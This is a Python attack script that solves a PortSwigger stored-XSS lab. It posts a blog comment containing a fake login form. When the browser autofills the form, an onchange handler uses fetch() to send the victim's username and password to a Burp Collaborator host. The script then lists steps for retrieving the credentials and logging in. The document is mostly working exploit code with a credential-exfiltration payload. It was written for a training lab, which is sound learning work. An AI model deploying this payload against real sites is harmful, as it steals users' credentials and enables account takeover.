# Lab 15 — Exploiting XSS to capture passwords
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
#
# Vulnerability: Blog comments (stored XSS)
# Aim:           Capture victim's auto-filled credentials and log in
#
# Technique:
#   Session cookie has HttpOnly — direct cookie theft is blocked.
#   Instead, inject a fake username/password form into the page.
#   When the victim's browser autofills the form, onchange fires and POSTs
#   the credentials to Collaborator.
#
#   Payload:
#     <input name=username id=username>
#     <input type=password name=password onchange="
#       if(this.value.length)
#         fetch('https://COLLAB',{method:'POST',mode:'no-cors',
#           body:username.value+':'+this.value});
#     ">
#
#   Browser autofill fills any <input type=password> whose name matches saved
#   credentials — it doesn't verify the form is legitimate.
#
# Requires: Burp Suite Pro — update COLLABORATOR_DOMAIN before running.
#
# Usage: python xss_lab15.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, post_comment

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.burpcollaborator.net"
# ────────────────────────────────────────────────────────────────────────────

POST_ID = 1

def build_payload(collab_domain):
    return (
        '<input name=username id=username>\n'
        '<input type=password name=password onchange="\n'
        '  if(this.value.length)\n'
        f"    fetch('https://{collab_domain}',"
        "{{method:'POST',mode:'no-cors',body:username.value+':'+this.value}});\n"
        '">'
    )

if __name__ == "__main__":
    banner()
    section("LAB 15 — EXPLOITING XSS: PASSWORD CAPTURE VIA AUTOFILL")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab15.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.burpcollaborator.net":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    payload = build_payload(COLLABORATOR_DOMAIN)
    print(f"  ➜  Posting credential-capture payload to post {POST_ID}...\n")
    print(f"  Payload:\n{payload}\n")

    r = post_comment(session, url, POST_ID, payload)

    if r is None:
        print("  ✘  Comment submission failed")
        sys.exit(1)

    print(f"  ✔  Comment submitted (status {r.status_code})")
    print()
    print("  ➜  Next steps:")
    print("     1. Open Burp Collaborator → click 'Poll now'")
    print("     2. Find the incoming POST — body contains 'username:password'")
    print("     3. Use the captured credentials to log in")
    print()
    print("  ℹ  Autofill fills any visible <input type=password> — it's not")
    print("     restricted to 'legitimate' forms. This bypasses HttpOnly entirely.")
